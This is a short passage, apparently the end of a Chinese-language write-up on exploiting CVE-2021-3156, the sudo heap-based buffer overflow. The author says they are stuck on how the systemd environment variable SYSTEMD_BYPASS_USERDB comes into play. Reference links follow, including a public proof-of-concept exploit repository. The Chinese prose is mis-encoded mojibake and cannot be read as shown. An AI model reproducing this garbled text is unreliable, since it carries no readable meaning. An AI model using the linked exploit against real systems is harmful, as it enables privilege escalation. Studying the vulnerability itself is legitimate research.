åŸæ–‡ç« ä¸­å†™çš„ç¯å¢ƒå˜é‡ä¸º`SYSTEMD_BYPASS_USERDB`ï¼Œæœç´¢äº†ä¸€ä¸‹è¯¥ç¯å¢ƒå˜é‡æ˜¯ä½äº`systemd`ä¸­ï¼Œä¸çŸ¥é“æ€ä¹ˆå‘ç”Ÿè°ƒç”¨ã€‚æ‰€ä»¥ç°åœ¨å¡ä½äº†ã€‚



## å‚è€ƒ

[åŒºåŸŸè®¾ç½®](https://zh.wikipedia.org/wiki/%E5%8C%BA%E5%9F%9F%E8%AE%BE%E7%BD%AE)

[Sudo Heap-Based Buffer Overflow](https://packetstormsecurity.com/files/161160/Sudo-Heap-Based-Buffer-Overflow.html)

[CVE-2021-3156 PoC](https://github.com/blasty/CVE-2021-3156)
